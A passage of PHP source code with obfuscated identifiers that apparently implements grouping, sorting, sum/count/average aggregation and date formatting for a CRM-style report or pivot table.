$ZZZZZn13;$ZZT1919 = count($ZZZz25);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZz25[$Zf5] = strtoupper(trim($ZZZZZn13[$Zf5]));} if($ZZZZZZZZZZZZZZZd3){arsort($ZZZz25);}else{asort($ZZZz25);} $ZZS1818 = array();foreach($ZZZz25 as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){$ZZS1818[] = $ZZZZZn13[$ZZZT1919];} return $ZZS1818;} function ZZZZZZZZZZZZZZZf5(&$ZZZZZZZZZZZZZZZg6,$ZZZZZZZZZZZZZZZh7,$ZZZZZZZZZZZZZZZi8){$ZZT1919 = count($ZZZZZZZZZZZZZZZg6);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZg6[$Zf5]["values"] = $ZZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZZg6[$Zf5]["name"]];if($ZZZZZZZZZZZZZZZi8 && $ZZZZZZZZZZZZZZZg6[$Zf5]["sort"] === 1){$ZZZZZZZZZZZZZZZg6[$Zf5]["values"] = $this->ZZZZZZZZZZZZZZZc2($ZZZZZZZZZZZZZZZg6[$Zf5]["values"]);} if($ZZZZZZZZZZZZZZZi8 && $ZZZZZZZZZZZZZZZg6[$Zf5]["sort"] === 2){$ZZZZZZZZZZZZZZZg6[$Zf5]["values"] = $this->ZZZZZZZZZZZZZZZc2($ZZZZZZZZZZZZZZZg6[$Zf5]["values"],true);}}} function ZZZZZZZZZZZZZZZj9($ZZZc2,$ZZZZZZZZZZZZZZZk10){$ZZS1818 = $ZZZZZZZZZZZZZZZk10;$ZZT1919 = count($ZZZc2);for($Zf5 = $ZZT1919;$Zf5>0;$Zf5--){$ZZZz25 = $ZZZc2[$Zf5-1];$ZZZz25["data"] = array();$ZZZz25["next"] = $ZZS1818;$ZZS1818 = $ZZZz25;} return $ZZS1818;} function ZZZZZZZZZZZZZZZl11($ZZZZZZu20,&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZn13,$ZZZH77){if($ZZZZZZZZZZZZZZZn13){$Zf5 =array_search($ZZZZZZu20[$ZZZZZZZZZZZZZZZm12["name"]],$ZZZZZZZZZZZZZZZm12["values"]);if(!isset($ZZZZZZZZZZZZZZZm12["data"][$Zf5])){$ZZZZZZZZZZZZZZZm12["data"][$Zf5] = $ZZZZZZZZZZZZZZZm12["next"];} $this->ZZZZZZZZZZZZZZZl11($ZZZZZZu20,$ZZZZZZZZZZZZZZZm12["data"][$Zf5],$ZZZZZZZZZZZZZZZn13-1,$ZZZH77);}else{$ZZT1919 = count($ZZZH77);for($Zf5 =0;$Zf5<$ZZT1919;$Zf5++){if($ZZZH77[$Zf5]["value"]["sum"]==true){$ZZZZZZZZZZZZZZZm12["data"][$ZZZH77[$Zf5]["selectedField"]."_sum"] = $ZZZZZZu20[$ZZZH77[$Zf5]["selectedField"]."_sum"];} if($ZZZH77[$Zf5]["value"]["count"]==true){$ZZZZZZZZZZZZZZZm12["data"][$ZZZH77[$Zf5]["selectedField"]."_cnt"] = $ZZZZZZu20[$ZZZH77[$Zf5]["selectedField"]."_cnt"];} if($ZZZH77[$Zf5]["value"]["avg"]==true){$ZZZZZZZZZZZZZZZm12["data"][$ZZZH77[$Zf5]["selectedField"]."_avg"] = $ZZZZZZu20[$ZZZH77[$Zf5]["selectedField"]."_avg"];}}}} function ZZZZZZZZZZZZZZZo14(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZp15,$ZZZZZZZZZZZZZZZq16,$ZZZH77,$ZZZZZZZZZZZZZZZr17,$ZZZZZZZZZZZZZZY2424){$ZZZZZZZZZZZZZZZn13 = $ZZZZZZZZZZZZZZZp15+$ZZZZZZZZZZZZZZZq16;if($ZZZZZZZZZZZZZZZr17<($ZZZZZZZZZZZZZZZn13 -1)) {if($ZZZZZZZZZZZZZZZm12["sort"] === 1 || $ZZZZZZZZZZZZZZZm12["sort"] === 2){ksort($ZZZZZZZZZZZZZZZm12["data"]);} foreach($ZZZZZZZZZZZZZZZm12["data"] as $ZZZT1919 =>$ZZZZZZZZZZZZZZZe4){$this->ZZZZZZZZZZZZZZZo14($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919],$ZZZZZZZZZZZZZZZp15,$ZZZZZZZZZZZZZZZq16,$ZZZH77,$ZZZZZZZZZZZZZZZr17+1,$ZZZZZZZZZZZZZZY2424);} if($ZZZZZZZZZZZZZZZq16 -1 <$ZZZZZZZZZZZZZZZr17){$this->ZZZZZZZZZZZZZZZs18($ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZr17,$ZZZZZZZZZZZZZZZn13);if($ZZZZZZZZZZZZZZZr17== 0){$this->ZZZZZZZZZZZZZZZt19($ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77);}}else{$this->ZZZZZZZZZZZZZZZu20($ZZZZZZZZZZZZZZZm12,($ZZZZZZZZZZZZZZZr17 === $ZZZZZZZZZZZZZZZq16-1));}}else{$this->ZZZZZZZZZZZZZZZv21($ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77);if($ZZZZZZZZZZZZZZZr17== 0){$this->ZZZZZZZZZZZZZZZt19($ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77);}}} function ZZZZZZZZZZZZZZZt19(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77){$ZZS1818 = array("cols"=>array(),"data"=>array(array()));$ZZZZZZZZZZZZZZs18 = count($ZZZH77);$ZZZZZZZZZZZZZZZw22 = array();for($ZZZZZK1010 =0;$ZZZZZK1010<$ZZZZZZZZZZZZZZs18;$ZZZZZK1010++){if($ZZZH77[$ZZZZZK1010]["value"]["sum"]==true){$ZZZZZZZZZZZZZZZw22[$ZZZH77[$ZZZZZK1010]["selectedField"]."_sum"] = $ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_sum"];} if($ZZZH77[$ZZZZZK1010]["value"]["count"]==true){$ZZZZZZZZZZZZZZZw22[$ZZZH77[$ZZZZZK1010]["selectedField"]."_cnt"] = $ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_cnt"];} if($ZZZH77[$ZZZZZK1010]["value"]["avg"]==true){$ZZZZZZZZZZZZZZZw22[$ZZZH77[$ZZZZZK1010]["selectedField"]."_avg"] = $ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_avg"];}} foreach($ZZZZZZZZZZZZZZZm12["cols"] as $ZZZT1919=>$ZZZZZZZZZZZZZZZe4){foreach ($ZZZZZZZZZZZZZZZw22 as $ZZZZZZZZZZZZZZZx23=>$ZZZZZZZZZZZZZZZy24) {$ZZS1818["data"][0][$ZZZT1919] = (isset($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]))?($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]):"";$ZZS1818["cols"][$ZZZT1919] = $ZZZZZZZZZZZZZZZe4;}} $ZZZZZZZZZZZZZZZm12 = $ZZS1818;} function ZZZZZZZZZZZZZZZs18(&$ZZZZZZZZZZZZZZZm12){$ZZS1818 = array("cols"=>array(),"data"=>array());$ZZT1919 = count($ZZZZZZZZZZZZZZZm12["values"]);reset($ZZZZZZZZZZZZZZZm12["data"]);$Zu20 = key($ZZZZZZZZZZZZZZZm12["data"]);for ($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++) {foreach($ZZZZZZZZZZZZZZZm12["data"][$Zu20]["cols"] as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){$ZZS1818["cols"]["v".$Zf5."_".$ZZZT1919] = $ZZZZZZZZZZZZZZZm12["values"][$Zf5]." ".$ZZZZZZZZZZZZZZZe4;}} foreach($ZZZZZZZZZZZZZZZm12["data"] as $ZZZT1919 =>$ZZZZZZZZZZZZZZZe4){foreach($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"] as $ZZZZZZZZZZZZZZZx23 =>$ZZZZZZZZZZZZZZZy24){$ZZS1818["data"]["v".$ZZZT1919."_".$ZZZZZZZZZZZZZZZx23] = $ZZZZZZZZZZZZZZZy24;}} $ZZZZZZZZZZZZZZZm12 = $ZZS1818;} function ZZZZZZZZZZZZZZZu20(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZz25){$ZZS1818 = array("cols"=>array(),"data"=>array());$ZZS1818["cols"][$ZZZZZZZZZZZZZZZm12["name"]] = $ZZZZZZZZZZZZZZZm12["title"];reset($ZZZZZZZZZZZZZZZm12["data"]);$Zu20 = key($ZZZZZZZZZZZZZZZm12["data"]);$ZZS1818["cols"] = array_merge($ZZS1818["cols"],$ZZZZZZZZZZZZZZZm12["data"][$Zu20]["cols"]);foreach ($ZZZZZZZZZZZZZZZm12["data"] as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){if($ZZZZZZZZZZZZZZZm12["values"][$ZZZT1919]===null){$ZZZZZZZZZZZZZZZm12["values"][$ZZZT1919] = " - ";} if($ZZZZZZZZZZZZZZZz25){$ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZZZZZm12["name"]] = $ZZZZZZZZZZZZZZZm12["values"][$ZZZT1919];$ZZS1818["data"][] = $ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"];}else{$ZZZZZZZZZZZZZZs18 = count($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"]);for ($ZZZZZK1010 = 0;$ZZZZZK1010 < $ZZZZZZZZZZZZZZs18;$ZZZZZK1010++) {$ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZK1010][$ZZZZZZZZZZZZZZZm12["name"]] = $ZZZZZZZZZZZZZZZm12["values"][$ZZZT1919];$ZZS1818["data"][] = $ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZK1010];}}} $ZZZZZZZZZZZZZZZm12 = $ZZS1818;} function ZZZZZZZZZZZZZZZv21(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77){$ZZT1919 = count($ZZZZZZZZZZZZZZZm12["values"]);$ZZS1818 = array("cols"=>array(),"data"=>array());for($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++){if(!empty($ZZZZZZZZZZZZZZZm12["data"][$Zf5])){foreach($ZZZZZZZZZZZZZZZm12["data"][$Zf5]["data"] as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){$this->ZZZZZZZZZZZZZZZw22[$ZZZT1919] = $ZZZZZZZZZZZZZZY2424[$ZZZT1919];$ZZS1818["cols"]["v".$Zf5."_".$ZZZT1919] = $ZZZZZZZZZZZZZZZm12["values"][$Zf5]." ".$ZZZZZZZZZZZZZZY2424[$ZZZT1919];$ZZS1818["data"]["v".$Zf5."_".$ZZZT1919] = $ZZZZZZZZZZZZZZZe4;}}else{$ZZZZZZZZZZZZZZs18 = count($ZZZH77);for($ZZZZZK1010 =0;$ZZZZZK1010<$ZZZZZZZZZZZZZZs18;$ZZZZZK1010++){if($ZZZH77[$ZZZZZK1010]["value"]["sum"]==true){$this->ZZZZZZZZZZZZZZZw22[$ZZZH77[$ZZZZZK1010]["selectedField"]."_sum"] = $ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_sum"];$ZZS1818["cols"]["v".$Zf5."_".$ZZZH77[$ZZZZZK1010]["selectedField"]."_sum"] = $ZZZZZZZZZZZZZZZm12["values"][$Zf5]." ".$ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_sum"];} if($ZZZH77[$ZZZZZK1010]["value"]["count"]==true){$this->ZZZZZZZZZZZZZZZw22[$ZZZH77[$ZZZZZK1010]["selectedField"]."_cnt"] = $ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_cnt"];$ZZS1818["cols"]["v".$Zf5."_".$ZZZH77[$ZZZZZK1010]["selectedField"]."_cnt"] = $ZZZZZZZZZZZZZZZm12["values"][$Zf5]." ".$ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_cnt"];} if($ZZZH77[$ZZZZZK1010]["value"]["avg"]==true){$this->ZZZZZZZZZZZZZZZw22[$ZZZH77[$ZZZZZK1010]["selectedField"]."_avg"] = $ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_avg"];$ZZS1818["cols"]["v".$Zf5."_".$ZZZH77[$ZZZZZK1010]["selectedField"]."_avg"] = $ZZZZZZZZZZZZZZZm12["values"][$Zf5]." ".$ZZZZZZZZZZZZZZY2424[$ZZZH77[$ZZZZZK1010]["selectedField"]."_avg"];}}}} $ZZZZZZZZZZZZZZZm12 = $ZZS1818;} function ZZZZZZZZZZZZZO1414($r17,$ZZZG66,$ZZZH77,$ZZZc2){$ZZZZZZZZZZZZZZZA00 = $r17["data"];$ZZZZZZZZZZZZZZZB11 = array();$ZZZZZZZZZW2222 = $this->ZZZZS1818->ZZZZZH77($ZZZc2, $ZZZG66);$ZZZZZZZZZZZZZZZC22 = array();$ZZZZZZZZZZZZZZZD33 = array();$ZZZZZZZZZZZZZZZE44 = array();$ZZT1919 = count($ZZZG66);for($Zf5 =0;$Zf5<$ZZT1919;$Zf5++){if(($ZZZG66[$Zf5]["sortAction"]=="group" || $ZZZG66[$Zf5]["sortAction"]=="groupsort")){if($ZZZG66[$Zf5]["name"]!="date_field" && isset($ZZZG66[$Zf5]['dateGrouping']) && !empty($ZZZG66[$Zf5]['dateGrouping'])) {$ZZZG66[$Zf5]['name'] = $ZZZG66[$Zf5]['name'] . '_' . $ZZZG66[$Zf5]['dateGrouping'];} if(isset($r17["cols"][$ZZZG66[$Zf5]["name"]])){$ZZZz25 = array("name" =>$ZZZG66[$Zf5]["name"], "title" => $r17["cols"][$ZZZG66[$Zf5]["name"]], "sort" => false);if($ZZZG66[$Zf5]["sortAction"]=="groupsort"){if(isset($ZZZG66[$Zf5]["sortDirection"]) && $ZZZG66[$Zf5]["sortDirection"] == "ASC"){$ZZZz25["sort"] = 1;}else{$ZZZz25["sort"] = 2;}} $ZZZZZZZZZZZZZZZE44[] = $ZZZG66[$Zf5]["name"];if($ZZZG66[$Zf5]["position"] == "row" || $ZZZG66[$Zf5]["position"] == ""){if($ZZZG66[$Zf5]["name"] == "00_ALL_assigned_user_id"){$ZZZZZZZZZZZZZZZF55 = false;}else{$ZZZZZZZZZZZZZZZF55 = $this->ZZZZS1818->ZZZZZw22($ZZZZZZZZZW2222[$ZZZG66[$Zf5]["name"]],$this->db,$this->ZZZZZZZZZZj9);} if($ZZZZZZZZZZZZZZZF55){$ZZZZZZZZZZZZZZZD33[] = array("name" =>$ZZZG66[$Zf5]["name"]."_id", "title" => $r17["cols"][$ZZZG66[$Zf5]["name"]], "sort" => false);$ZZZZZZZZZZZZZZZD33[] = array("name" =>$ZZZG66[$Zf5]["name"]."_setype", "title" => $r17["cols"][$ZZZG66[$Zf5]["name"]], "sort" => false);$ZZZZZZZZZZZZZZZB11[] = $ZZZG66[$Zf5]["name"]."_id";$ZZZZZZZZZZZZZZZB11[] = $ZZZG66[$Zf5]["name"]."_setype";$ZZZZZZZZZZZZZZZE44[] = $ZZZG66[$Zf5]["name"]."_id";$ZZZZZZZZZZZZZZZE44[] = $ZZZG66[$Zf5]["name"]."_setype";} $ZZZZZZZZZZZZZZZD33[] = $ZZZz25;}else{$ZZZZZZZZZZZZZZZC22[] = $ZZZz25;}}}} $ZZZZZZZZZZZZZZZG66 = $this->ZZZZZZZZZZZZZZZ2525($ZZZZZZZZZZZZZZZE44,$ZZZZZZZZZZZZZZZA00);$this->ZZZZZZZZZZZZZZZf5($ZZZZZZZZZZZZZZZD33,$ZZZZZZZZZZZZZZZG66,true);$this->ZZZZZZZZZZZZZZZf5($ZZZZZZZZZZZZZZZC22,$ZZZZZZZZZZZZZZZG66,false);$ZZZZZZZZZZZZZZZH77 = $this->ZZZZZZZZZZZZZZZj9($ZZZZZZZZZZZZZZZC22,array());$ZZZZZZZZZZZZZZZm12 = $this->ZZZZZZZZZZZZZZZj9($ZZZZZZZZZZZZZZZD33,$ZZZZZZZZZZZZZZZH77);$ZZZZZZZZZZZZZZZn13 = count($ZZZZZZZZZZZZZZZD33) + count($ZZZZZZZZZZZZZZZC22);$ZZT1919 = count($ZZZZZZZZZZZZZZZA00);for($Zf5 =0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZZZZZZZZZZZl11($ZZZZZZZZZZZZZZZA00[$Zf5],$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZn13,$ZZZH77);} $this->ZZZZZZZZZZZZZZX2323 = $ZZZZZZZZZZZZZZZD33;$this->ZZZH77 = $ZZZH77;$this->ZZZZZZZZZZZZZZY2424 = $r17["cols"];$this->ZZZZZZZZZZZZZZZo14($ZZZZZZZZZZZZZZZm12,count($ZZZZZZZZZZZZZZZC22),count($ZZZZZZZZZZZZZZZD33),$ZZZH77,0,$r17["cols"]);$ZZT1919 = count($ZZZZZZZZZZZZZZZB11);for($Zf5 =0;$Zf5<$ZZT1919;$Zf5++){unset($ZZZZZZZZZZZZZZZm12["cols"][$ZZZZZZZZZZZZZZZB11[$Zf5]]);} return $ZZZZZZZZZZZZZZZm12;}} class ZZZZZZZZZZZZZM1212 extends ZZZZZZZZZZZZZN1313{function ZZZZZZZZZZZZZZZs18(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZr17,$ZZZZZZZZZZZZZZZn13){if($ZZZZZZZZZZZZZZZr17 == $ZZZZZZZZZZZZZZZn13 - 1){$ZZS1818 = array("cols"=>array(""=>""),"data"=>array());$ZZZZZZZZZZZZZZZm12 = $ZZS1818;}else{parent::ZZZZZZZZZZZZZZZs18($ZZZZZZZZZZZZZZZm12);}} function ZZZZZZZZZZZZZZZt19(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77){$ZZS1818 = array("cols"=>array("aggregates"=>"Aggregate"),"data"=>array(array()));$ZZZz25 = array();foreach($ZZZZZZZZZZZZZZZm12["cols"] as $ZZZT1919=>$ZZZZZZZZZZZZZZZe4){$ZZS1818["cols"][$ZZZT1919] = $ZZZZZZZZZZZZZZZe4;if(isset($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]))foreach ($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"] as $ZZZZZZZZZZZZZZZx23=>$ZZZZZZZZZZZZZZZy24) {if(!isset($ZZZz25[$ZZZZZZZZZZZZZZZx23])){$ZZZz25[$ZZZZZZZZZZZZZZZx23] = array("aggregates"=>$ZZZZZZZZZZZZZZY2424[$ZZZZZZZZZZZZZZZx23]);} $ZZZz25[$ZZZZZZZZZZZZZZZx23][$ZZZT1919] = (is_array($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"]) && isset($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZZZZZx23]))?($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZZZZZx23]):"";}} $ZZS1818["data"] = array_values($ZZZz25);$ZZZZZZZZZZZZZZZm12 = $ZZS1818;} function ZZZZZZZZZZZZZZZu20(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZZI88){if($ZZZZZZZZZZZZZZZI88){$ZZZZZZZZZZZZZZY2424 = $this->ZZZZZZZZZZZZZZY2424;$ZZZH77 = $this->ZZZH77;$ZZT1919 = count($ZZZZZZZZZZZZZZZm12["values"]);$ZZZZZZZZZZZZZZZJ99["aggregates"] = "Aggregate";reset($ZZZZZZZZZZZZZZZm12["data"]);$Zu20 = key($ZZZZZZZZZZZZZZZm12["data"]);$ZZZZZZZZZZZZZZZJ99 = array_merge($ZZZZZZZZZZZZZZZJ99,$ZZZZZZZZZZZZZZZm12["data"][$Zu20]["cols"]);$ZZZZZZZZZZZZZZs18 = count($ZZZZZZZZZZZZZZZm12["data"][$Zu20]["cols"]);$ZZZZZZZZZZZd3 = array_keys($ZZZZZZZZZZZZZZZm12["data"][$Zu20]["cols"]);$ZZZZZZZZZZZZZZZK1010 = count($ZZZH77);$ZZZZZq16 = array();for($Zf5=0;$Zf5<$ZZZZZZZZZZZZZZZK1010;$Zf5++){$ZZZZZZZZZZZZZZZL1111 = array("aggregates"=>($ZZZH77[$Zf5]["value"]["sum"]==true)?$ZZZZZZZZZZZZZZY2424[$ZZZH77[$Zf5]["selectedField"]."_sum"]:"");$ZZZZZZZZZZZZZZZM1212 = array("aggregates"=>($ZZZH77[$Zf5]["value"]["count"]==true)?$ZZZZZZZZZZZZZZY2424[$ZZZH77[$Zf5]["selectedField"]."_cnt"]:"");$ZZZZZZZZZZZZZZZN1313 = array("aggregates"=>($ZZZH77[$Zf5]["value"]["avg"]==true)?$ZZZZZZZZZZZZZZY2424[$ZZZH77[$Zf5]["selectedField"]."_avg"]:"");for($ZZZT1919 = 0;$ZZZT1919<$ZZT1919;$ZZZT1919++){$ZZZZZZZZZZZZZZZO1414 = $ZZZZZZZZZZZZZZZL1111;$ZZn13 = $ZZZZZZZZZZZZZZZM1212;$ZZZZZZZZZZZZZZZP1515 = $ZZZZZZZZZZZZZZZN1313;for($ZZZZZK1010=0;$ZZZZZK1010<$ZZZZZZZZZZZZZZs18;$ZZZZZK1010++){if($ZZZH77[$Zf5]["value"]["sum"]==true){if(!empty($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZd3[$ZZZZZK1010]])){$ZZZZZZZZZZZZZZZO1414[$ZZZZZZZZZZZd3[$ZZZZZK1010]] = $ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZd3[$ZZZZZK1010]]["data"][$ZZZH77[$Zf5]["selectedField"]."_sum"];}} if($ZZZH77[$Zf5]["value"]["count"]==true){if(!empty($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZd3[$ZZZZZK1010]])){$ZZn13[$ZZZZZZZZZZZd3[$ZZZZZK1010]] = $ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZd3[$ZZZZZK1010]]["data"][$ZZZH77[$Zf5]["selectedField"]."_cnt"];}} if($ZZZH77[$Zf5]["value"]["avg"]==true){if(!empty($ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZd3[$ZZZZZK1010]])){$ZZZZZZZZZZZZZZZP1515[$ZZZZZZZZZZZd3[$ZZZZZK1010]] = $ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"][$ZZZZZZZZZZZd3[$ZZZZZK1010]]["data"][$ZZZH77[$Zf5]["selectedField"]."_avg"];}}} if(!isset($ZZZZZq16[$ZZZT1919])){$ZZZZZq16[$ZZZT1919] = array();} if(count($ZZZZZZZZZZZZZZZO1414)>1){$ZZZZZq16[$ZZZT1919][]=$ZZZZZZZZZZZZZZZO1414;} if(count($ZZn13)>1){$ZZZZZq16[$ZZZT1919][]=$ZZn13;} if(count($ZZZZZZZZZZZZZZZP1515)>1){$ZZZZZq16[$ZZZT1919][]=$ZZZZZZZZZZZZZZZP1515;}}} for($ZZZZZK1010=0;$ZZZZZK1010<$ZZZZZZZZZZZZZZs18;$ZZZZZK1010++){if($ZZZZZZZZZZZZZZZJ99[$ZZZZZZZZZZZd3[$ZZZZZK1010]] === null){$ZZZZZZZZZZZZZZZJ99[$ZZZZZZZZZZZd3[$ZZZZZK1010]] = "-";}} for($ZZZT1919 = 0;$ZZZT1919<$ZZT1919;$ZZZT1919++){if(!empty($ZZZZZq16[$ZZZT1919])){$ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["cols"] = $ZZZZZZZZZZZZZZZJ99;$ZZZZZZZZZZZZZZZm12["data"][$ZZZT1919]["data"] = $ZZZZZq16[$ZZZT1919];}}} parent::ZZZZZZZZZZZZZZZu20($ZZZZZZZZZZZZZZZm12,false);} function ZZZZZZZZZZZZZZZv21(&$ZZZZZZZZZZZZZZZm12,$ZZZZZZZZZZZZZZY2424,$ZZZH77){$ZZT1919 = count($ZZZZZZZZZZZZZZZm12["values"]);$ZZS1818 = array("cols"=>array(),"data"=>array());for($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++){$ZZS1818["cols"]["v".$Zf5."_"] = $ZZZZZZZZZZZZZZZm12["values"][$Zf5];if(isset($ZZZZZZZZZZZZZZZm12["data"][$Zf5])){$ZZS1818["data"]["v".$Zf5."_"] = $ZZZZZZZZZZZZZZZm12["data"][$Zf5];}} $ZZZZZZZZZZZZZZZm12 = $ZZS1818;}}
class ZZZZZZZZZZZZZK1010{protected $ZZZZZZZZZZZZZZZQ1616 = array();protected $ZZZZZZZZZZZZZF55 = array();protected $ZZT1919 = 0;protected $ZZZZS1818;protected $db;protected $dateFormat;protected $ZZZc2;protected $ZZZZZZZZZZZZZC22;function __construct($ZZZZS1818,$db,$ZZZc2,$ZZZG66,$ZZZZZZZZZZZZZF55,$dateFormat,$ZZZZZZZZZZZZZC22) {$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;$this->ZZZZZZZZZZZZZZZQ1616 = $this->ZZZZZZZZZZZZZZZR1717($ZZZc2,$ZZZG66);$this->ZZT1919 = count($this->ZZZZZZZZZZZZZZZQ1616);$this->ZZZc2 = $ZZZc2;$this->ZZZZZZZZZZZZZF55 = $ZZZZZZZZZZZZZF55;$this->dateFormat = $dateFormat;$this->ZZZZZZZZZZZZZC22 = $ZZZZZZZZZZZZZC22;} protected function ZZZZZZZZZZZZZZZR1717($ZZZc2,$ZZZG66){$ZZS1818 = array();$ZZZZZZZZZZZZZZZS1818 = array();$ZZZZZF55 = 0;$ZZT1919 = count($ZZZc2);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(in_array($ZZZc2[$Zf5]["uitype"],array('date', 'datetime', 'datetimecombo', 'enum', 'multienum', 'currency', 'dynamicenum'))){$ZZS1818[$ZZZZZF55] = $ZZZc2[$Zf5];$ZZZZZZZZZZZZZZZS1818[$ZZZc2[$Zf5]["fieldname"]] = &$ZZS1818[$ZZZZZF55];$ZZZZZF55++;}} $ZZT1919 = count($ZZZG66);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(isset($ZZZZZZZZZZZZZZZS1818[$ZZZG66[$Zf5]["name"]])){if(isset($ZZZG66[$Zf5]["dateGrouping"])){$ZZZZZZZZZZZZZZZS1818[$ZZZG66[$Zf5]["name"]]["dateGrouping"]= $ZZZG66[$Zf5]["dateGrouping"];}}} $ZZZZZZZZZZZZZZZT1919 = array();foreach($ZZS1818 as $ZZZZZZZZZZZZZZZU2020) {if(isset($ZZZZZZZZZZZZZZZU2020['dateGrouping']) && !empty($ZZZZZZZZZZZZZZZU2020['dateGrouping']) && $ZZZZZZZZZZZZZZZU2020['fieldname']!="date_field") {foreach($ZZZG66 as $ZZZZZZZZZZZZZZZV2121) {$ZZZZZZZZZZZZZZZW2222 = $ZZZZZZZZZZZZZZZV2121['name'] . '_' . $ZZZZZZZZZZZZZZZV2121['dateGrouping'];if($ZZZZZZZZZZZZZZZU2020['fieldname'] == $ZZZZZZZZZZZZZZZV2121['name']) {$ZZZZZZZZZZZZZZZX2323 = $ZZZZZZZZZZZZZZZU2020;$ZZZZZZZZZZZZZZZX2323['fieldname'] = $ZZZZZZZZZZZZZZZW2222;$ZZZZZZZZZZZZZZZX2323['dateGrouping'] = $ZZZZZZZZZZZZZZZV2121['dateGrouping'];$ZZZZZZZZZZZZZZZT1919[] = $ZZZZZZZZZZZZZZZX2323;} else if ($ZZZZZZZZZZZZZZZU2020['fieldname'] == $ZZZZZZZZZZZZZZZW2222){$ZZZZZZZZZZZZZZZT1919[] = $ZZZZZZZZZZZZZZZU2020;}}} else {$ZZZZZZZZZZZZZZZT1919[] = $ZZZZZZZZZZZZZZZU2020;}} $ZZS1818 = $ZZZZZZZZZZZZZZZT1919;return $ZZS1818;} function ZZZZZZZZZZZZZZZY2424($ZZZZZZZZZZZZZZZZ2525){$ZZZz25 = explode(" ",$ZZZZZZZZZZZZZZZZ2525,2);$ZZZZZZZZZZZZk10 = explode("-",$ZZZz25[0],3);if(count($ZZZZZZZZZZZZk10) == 1) {return $this->ZZZZS1818->ZZZZZE44($ZZZZZZZZZZZZk10[0]);} if(!preg_match("/^[0-9]{1,2}$/",$ZZZZZZZZZZZZk10[1])){return $ZZZZZZZZZZZZZZZZ2525;} $ZZZZZZZZZZZZk10[1] = $this->ZZZZS1818->ZZZZZE44(intval($ZZZZZZZZZZZZk10[1],10));switch($this->dateFormat){case "mm-dd-yyyy": $ZZZz25[0] = $ZZZZZZZZZZZZk10[1]."-".$ZZZZZZZZZZZZk10[2]."-".$ZZZZZZZZZZZZk10[0];break;case "dd-mm-yyyy": $ZZZz25[0] = $ZZZZZZZZZZZZk10[2]."-".$ZZZZZZZZZZZZk10[1]."-".$ZZZZZZZZZZZZk10[0];break;case "yyyy-mm-dd": default: $ZZZz25[0] = $ZZZZZZZZZZZZk10[0]."-".$ZZZZZZZZZZZZk10[1]."-".$ZZZZZZZZZZZZk10[2];break;} $ZZS1818 = $ZZZz25[0];if(isset($ZZZz25[1])){$ZZS1818.=" ".$ZZZz25[1];} return $ZZS1818;} function ZZZZZZZZZZZZZZZZa0($value,$field,$ZZZZZZZZZZj9){static $ZZZp15 = array('its_currencies' 